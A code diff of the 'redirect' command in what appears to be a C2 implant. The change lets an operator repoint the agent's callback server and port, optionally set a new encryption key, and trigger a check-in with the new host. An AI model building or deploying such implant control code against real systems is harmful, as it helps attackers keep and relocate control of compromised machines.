@@ -1,13 +1,15 @@
 def redirect(task_id, command):
 
-    params = command.split(":")
+    params = command.replace(":", " ")
 
-    print(len(params))
+    params = params.split(" ")
 
-    if len(params) != 2:
+    print(params)
+
+    if len(params) < 2:
         response = {
             'task_id': task_id,
-            "user_output": "usage redirect <host:port>",
+            "user_output": "usage redirect <host:port> [OPTIONAL] <encryption_key>",
             'completed': True
         }
         responses.append(response)
@@ -18,12 +20,21 @@ def redirect(task_id, command):
         ip = params[0]
         port = params[1]
 
-        agent.Server = "http://" + ip
-        agent.Port = port
+        if len(params) > 2:
+            print(colored("Setting key {}".format(params[2]), "red"))
+            agent.set_Encryption_key(params[2])
+
+        
+        agent.set_Server("http://" + ip)
+        agent.set_Port(port)
+
+        print(colored("Switching to {}:{}".format(agent.get_Server(), agent.get_Port())))
+
+        checkin()
 
         response = {
                 'task_id': task_id,
-                "user_output": "Redirected to {}:{}".format(agent.Server,agent.Port),
+                "user_output": "Redirected to {}:{}".format(agent.get_Server(), agent.get_Port()),
                 'completed': True
             }
         responses.append(response)
